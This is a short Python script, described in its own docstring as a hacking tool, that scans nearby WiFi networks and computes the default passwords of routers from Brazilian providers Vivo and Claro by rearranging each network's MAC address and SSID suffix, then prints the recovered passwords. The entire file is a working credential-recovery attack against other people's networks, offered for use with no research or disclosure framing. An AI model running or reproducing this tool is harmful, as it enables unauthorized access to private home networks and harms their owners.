"""
Hacking tool that gets default passwords for brazilian IPS
"""
import argparse
import wifi


def get_wifi_info(interface) -> list:
    """
    Return a list with ssid and mac addresses
    """
    try:
        iw_cells = wifi.Cell.all(interface)
        wifi_info = [(cell.ssid, cell.address) for cell in iw_cells]
        return wifi_info
    except Exception as e:
        print(f"An error occurred: {e}")
        return None


def is_vuln(ssid: str) -> bool:
    """
    Check if the ssid contains the default name pattern
    """
    if 'VIVOFIBRA-' in ssid or 'CLARO' in ssid or 'VIVO-' in ssid:
        return True
    return False


def own_vivofibra(ssid: str,mac:str) -> str:
    """
    Own vivo fibra default password
    """
    return mac.replace(":","").lower()[2:8] + ssid.split("-")[1].lower()


def own_vivo(mac: str) -> str:
    """
    Own vivo default password
    """
    return mac.replace(":","").upper()[2:]


def own_claro(mac: str) -> str:
    """
    Own claro default password
    """
    return mac.replace(":","").upper()[4:]


def wifi_owner(wifi_list: list):
    """
    Checks which own algorithm to use
    """
    if wifi_list:
        print("Available WiFi Information:")
        for ssid, mac_address in wifi_list:
            if is_vuln(ssid):
                if 'VIVOFIBRA-' in ssid:
                    print(f"  Password: {own_vivofibra(ssid=ssid, mac=mac_address)}\tSSID: {ssid}")
                if 'VIVO-' in ssid:
                    print(f"  Password: {own_vivo(mac=mac_address)}\tSSID: {ssid}")
                if 'CLARO-' in ssid:
                    print(f"  Password: {own_claro(mac=mac_address)}\tSSID: {ssid}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface",
                        default="wlp0s20f3",
                        help="Specify the network interface (default: wlp0s20f3)")
    args = parser.parse_args()
    wifi_owner(get_wifi_info(args.interface))
